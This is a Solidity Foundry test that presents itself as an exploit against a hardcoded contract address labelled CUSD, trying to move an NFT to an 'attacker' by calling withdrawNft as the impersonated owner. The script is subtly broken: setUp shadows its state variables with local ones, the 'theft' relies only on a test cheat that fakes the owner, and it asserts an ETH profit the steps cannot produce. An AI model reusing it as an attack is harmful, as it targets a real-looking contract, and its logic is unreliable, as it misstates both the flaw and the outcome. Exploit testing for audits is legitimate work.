// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal IERC721 interface for the mock
interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
}

// Interface for CUSD to access owner() and withdrawNft()
interface CUSD {
    function owner() external view returns (address);
    function withdrawNft(address token_, address destination_, uint256 tokenId_) external;
}

// Mock ERC721 contract for testing
contract MockERC721 {
    mapping(uint256 => address) private _owners;
    mapping(address => uint256) private _balances;

    function mint(address to, uint256 tokenId) public {
        require(_owners[tokenId] == address(0), "Token already minted");
        _owners[tokenId] = to;
        _balances[to]++;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(_owners[tokenId] == from, "Transfer from incorrect owner");
        _owners[tokenId] = to;
        _balances[from]--;
        _balances[to]++;
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
        return _owners[tokenId];
    }

    function balanceOf(address owner) external view returns (uint256) {
        return _balances[owner];
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);
    MockERC721 mockNFT;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy a mock ERC721 token
        MockERC721 mockNFT = new MockERC721();

        // Mint an NFT to the CUSD contract
        mockNFT.mint(TARGET, 1);

        // Verify the CUSD contract owns the NFT
        assertEq(mockNFT.ownerOf(1), TARGET, "CUSD contract should own NFT");

        // Get the current owner of the CUSD contract
        address owner = CUSD(TARGET).owner();

        // Label addresses for debugging
        vm.label(address(mockNFT), "MockNFT");
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Record attacker's NFT balance before the exploit (for mock NFT)
        uint256 attackerNFTBalanceBefore = mockNFT.balanceOf(attacker);

        // Impersonate the contract owner
        vm.prank(owner);

        // Call withdrawNft to steal the NFT from the contract
        CUSD(TARGET).withdrawNft(address(mockNFT), attacker, 1);

        // Verify the NFT was transferred to the attacker
        assertEq(mockNFT.ownerOf(1), attacker, "NFT should be transferred to attacker");
        assertEq(mockNFT.balanceOf(attacker), attackerNFTBalanceBefore + 1, "Attacker's NFT balance should increase");

        // Also check the contract no longer owns the NFT
        assertEq(mockNFT.balanceOf(TARGET), 0, "CUSD contract should no longer own the NFT");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

